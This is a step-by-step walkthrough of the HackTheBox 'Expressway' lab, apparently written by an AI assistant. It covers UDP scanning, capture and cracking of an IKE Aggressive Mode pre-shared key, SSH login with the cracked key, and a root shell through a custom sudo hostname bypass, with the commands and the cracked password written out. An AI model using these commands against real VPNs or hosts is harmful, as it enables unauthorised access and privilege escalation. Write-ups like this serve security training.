
Here is a structured walkthrough for the **Expressway** HackTheBox machine, based on the reference provided.

This box is an excellent case study in why thorough UDP scanning is critical when TCP ports seem quiet. It moves from network-layer attacks (IPSec/IKE) to application-layer privilege escalation (custom sudo configuration).

---
## 1. Initial Reconnaissance

The first step is always to map the attack surface. Since standard TCP scans often miss services running on UDP (which is common for VPNs and network infrastructure), a multi-protocol approach is necessary here.

### TCP Scan

We start with a standard Nmap scan to identify open TCP ports.

```bash
nmap -sV -sC 10.10.11.87

```

* **Result:** Only **Port 22 (SSH)** is open.
* **Analysis:** A single SSH port usually implies the "front door" is locked. We need to look for side doors, typically via UDP or web apps on non-standard ports.

### UDP Scan

Since TCP was quiet, we widen the scope to UDP. This is slower but essential for finding protocols like TFTP, SNMP, or IKE.

```bash
nmap -sU -sV -T4 10.10.11.87

```

**Key Findings:**

* **Port 69/udp:** TFTP
* **Port 500/udp:** ISAKMP/IKE (This is our primary target)
* **Port 4500/udp:** NAT-T (Associated with IPSec)

> **Insight:** Port 500 confirms the presence of an **IPSec VPN**. Older or misconfigured IKE (Internet Key Exchange) implementations are often vulnerable to enumeration and offline cracking.

---

## 2. IKE Enumeration & Exploitation

We use `ike-scan` to probe the VPN service. Our goal is to determine if the server allows **Aggressive Mode**, which is faster than Main Mode but less secure because it transmits the identity and authentication hash before a secure channel is fully established.

### Phase 1: Identification

First, check the handshake configuration:

```bash
sudo ike-scan -M 10.10.11.87
```

* **Result:** The server uses `3DES`, `SHA1`, and requires a Pre-Shared Key (PSK). The presence of "XAUTH" and specific Vendor IDs suggests it might be vulnerable to Aggressive Mode.

### Phase 2: Aggressive Mode Leak

We force Aggressive Mode to try and capture the PSK hash.

```bash
sudo ike-scan -A -P psk.txt 10.10.11.87
```

* **Outcome:**
1. **Identity Leaked:** `ike@expressway.htb`
2. **Hash Captured:** A 20-byte hash is saved to `psk.txt`.



### Phase 3: Cracking the PSK

Now that we have the hash, we can attack it offline using a dictionary attack.

**1. Capture the full handshake:**

```bash
sudo ike-scan -M --aggressive 10.10.11.87 -n ike@expressway.htb --pskcrack=hash.txt

```

**2. Crack the hash:**

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

```

* **Cracked PSK:** `freakingrockstarontheroad`

---

## 3. Gaining Access (User Flag)

With the Pre-Shared Key (PSK) in hand, we can authenticate via SSH using the leaked identity found during the IKE enumeration.

```bash
ssh ike@10.10.11.87
# Password: freakingrockstarontheroad

```

Once logged in:

```bash
cat user.txt

```

* **Status:** User flag captured.

---

## 4. Privilege Escalation

Enumeration inside the box reveals a standard Debian environment, but checking sudo permissions reveals a critical anomaly.

### The Anomaly

When checking permissions with `sudo -l`, we receive a custom error message instead of the standard system response.

```bash
ike@expressway:~$ sudo -l
# Output: Sorry, user ike may not run sudo on expressway.

```

Checking the binary path explains why:

```bash
which sudo
# Output: /usr/local/bin/sudo

```

The system is using a **custom SUID binary** located in `/usr/local/bin/` rather than the standard system binary. This strongly implies the binary has custom logic we can bypass.

### Hunting for Internal Hostnames

The error message `...not run sudo on expressway` suggests the sudo binary checks the **hostname**. To exploit this, we need to find a valid "internal" hostname that is allowed to run sudo.

We inspect the **Squid Proxy logs**, a common place to find internal traffic artifacts.

```bash
cat /var/log/squid/access.log.1

```

* **Discovery:** A log entry shows a connection to `http://offramp.expressway.htb`.
* **Logic:** The system likely allows administrative tasks if they originate from (or target) this internal hostname.

### Hostname Bypass Exploitation

The `sudo` command includes a `-h` flag, which allows specifying a hostname (normally used for auditing or distributed sudo policies). We can abuse this to "spoof" the allowed hostname.

**The Payload:**
We invoke the custom sudo binary, passing the discovered internal hostname:

```bash
/usr/local/bin/sudo -h offramp.expressway.htb -i

```

* **Result:** The custom binary accepts the "offramp" hostname as trusted and grants a root shell.

```bash
root@expressway:~# cat /root/root.txt

```

* **Status:** Root flag captured.

---

### Summary of Techniques

| Stage            | Technique                       | Tool               |
| ---------------- | ------------------------------- | ------------------ |
| **Recon**        | UDP Scanning                    | `nmap -sU`         |
| **Exploitation** | IKE Aggressive Mode PSK Capture | `ike-scan`         |
| **Cracking**     | Offline Dictionary Attack       | `psk-crack`        |
| **PrivEsc**      | Sudo Hostname Bypass            | Custom SUID binary |

Would you like me to explain more about how IKE Aggressive mode works and why it is considered dangerous?